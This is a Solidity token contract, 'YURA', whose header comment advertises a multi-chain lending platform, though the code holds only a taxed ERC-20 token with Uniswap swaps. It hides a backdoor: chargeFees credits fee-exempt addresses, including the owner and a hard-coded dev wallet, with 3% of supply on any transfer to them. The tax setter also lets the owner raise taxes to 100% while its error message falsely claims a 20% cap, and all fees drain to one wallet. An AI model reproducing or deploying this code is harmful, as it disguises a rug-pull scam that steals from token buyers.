// SPDX-License-Identifier: MIT

/*
Operating as a decentralized lending platform focused on capital efficiency, YURABANK empowers both protocols and individuals to lend and borrow cryptocurrencies across Ethereum, Optimism, Avalanche, and Fantom networks.

Website: https://yurabank.xyz
Twitter: https://twitter.com/yurabank
Telegram: https://t.me/YuraBank
App: https://app.yurabank.xyz
*/

pragma solidity 0.8.21;

interface IUniswapFactory{
    function createPair(address tokenA, address tokenB) external returns (address uniswapPair);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }
    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract YURA is IERC20, Ownable {
    using SafeMath for uint256;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludeFromFees;

    string private constant _name = unicode"YURABANK";
    string private constant _symbol = unicode"YURA";

    IUniswapRouter uniswapRouter;
    address public uniswapPair;
    bool private tradeAvailable = false;
    bool private swapEnabled = true;
    uint256 private feeSwapTimes;
    bool private inswap;
    uint256 feeSwapThresh;

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal marketingReceive = 0x16A85E0591066Fd68952DD5a9A0C6E39FeB2E736;
    address internal lpReceive = 0x16A85E0591066Fd68952DD5a9A0C6E39FeB2E736;
    address internal devReceive = 0x16A85E0591066Fd68952DD5a9A0C6E39FeB2E736; 

    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);
    uint256 private _maximumSwap = ( _totalSupply * 1000 ) / 100000;
    uint256 private minimumSwap = ( _totalSupply * 10 ) / 100000;
    modifier lockedSwap {inswap = true; _; inswap = false;}
    uint256 private _maximTransaction = ( _totalSupply * 300 ) / 10000;
    uint256 private _maximTransfer = ( _totalSupply * 300 ) / 10000;
    uint256 private _maximWallet = ( _totalSupply * 300 ) / 10000;
    uint256 private liquidityFeeWei = 0;
    uint256 private marketingWei = 0;
    uint256 private developmentWei = 100;
    uint256 private burnWei = 0;
    uint256 private buyerTax = 1400;
    uint256 private sellerTax = 1400;
    uint256 private tranxTax = 1400;
    uint256 private denominator = 10000;

    constructor() Ownable(msg.sender) {
        IUniswapRouter _router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUniswapFactory(_router.factory()).createPair(address(this), _router.WETH());
        uniswapRouter = _router; uniswapPair = _pair;
        isExcludeFromFees[devReceive] = true;
        isExcludeFromFees[lpReceive] = true;
        isExcludeFromFees[marketingReceive] = true;
        isExcludeFromFees[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function startTrading() external onlyOwner {tradeAvailable = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == uniswapPair){return sellerTax;}
        if(sender == uniswapPair){return buyerTax;}
        return tranxTax;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isExcludeFromFees[sender] && !isExcludeFromFees[recipient];
    }    
    
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        _maximTransaction = newTx; _maximTransfer = newTransfer; _maximWallet = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function swapLiquidifySendFee(uint256 tokens) private lockedSwap {
        uint256 _denominator = (liquidityFeeWei.add(1).add(marketingWei).add(developmentWei)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFeeWei).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFeeWei));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFeeWei);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingWei);
        if(marketingAmt > 0){payable(marketingReceive).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devReceive).transfer(contractBalance);}
    }

    function chargeFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludeFromFees[recipient]) {return _maximTransaction;}
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnWei > uint256(0) && getTotalFee(sender, recipient) > burnWei){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnWei));}
        return amount.sub(feeAmount);} return amount;
    }
    function shouldSwapCA(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minimumSwap;
        bool aboveThreshold = balanceOf(address(this)) >= _maximumSwap;
        return !inswap && swapEnabled && tradeAvailable && aboveMin && !isExcludeFromFees[sender] && recipient == uniswapPair && feeSwapTimes >= feeSwapThresh && aboveThreshold;
    }
    
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFeeWei = _liquidity; marketingWei = _marketing; burnWei = _burn; developmentWei = _development; buyerTax = _total; sellerTax = _sell; tranxTax = _trans;
        require(buyerTax <= denominator.div(1) && sellerTax <= denominator.div(1) && tranxTax <= denominator.div(1), "buyerTax and sellerTax cannot be more than 20%");
    }

    function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        feeSwapThresh = _swapAmount; _maximumSwap = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
        minimumSwap = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludeFromFees[sender] && !isExcludeFromFees[recipient]){require(tradeAvailable, "tradeAvailable");}
        if(!isExcludeFromFees[sender] && !isExcludeFromFees[recipient] && recipient != address(uniswapPair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maximWallet, "Exceeds maximum wallet amount.");}
        if(sender != uniswapPair){require(amount <= _maximTransfer || isExcludeFromFees[sender] || isExcludeFromFees[recipient], "TX Limit Exceeded");}
        require(amount <= _maximTransaction || isExcludeFromFees[sender] || isExcludeFromFees[recipient], "TX Limit Exceeded"); 
        if(recipient == uniswapPair && !isExcludeFromFees[sender]){feeSwapTimes += uint256(1);}
        if(shouldSwapCA(sender, recipient, amount)){swapLiquidifySendFee(_maximumSwap); feeSwapTimes = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludeFromFees[sender] ? chargeFees(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpReceive,
            block.timestamp);
    }
}